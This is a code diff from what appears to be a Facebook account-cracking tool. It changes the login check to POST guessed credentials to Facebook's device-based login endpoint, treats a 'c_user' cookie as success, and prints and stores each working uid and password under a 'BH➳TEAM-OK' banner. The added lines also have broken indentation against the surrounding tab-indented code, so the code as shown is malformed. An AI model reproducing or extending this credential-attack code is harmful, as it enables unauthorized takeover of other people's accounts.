@@ -1288,7 +1288,9 @@ class Main:
 }
 
 response = requests.get('https://mbasic.facebook.com/', cookies=cookies, headers=headers)
-			if "session_key" in response.text and "EAAA" in response.text:
+			        lo = session.post('https://web.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
+                                log_cookies=session.cookies.get_dict().keys()
+                                if 'c_user' in log_cookies:
 				print("\r \033[0;92m[ BH➳TEAM-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
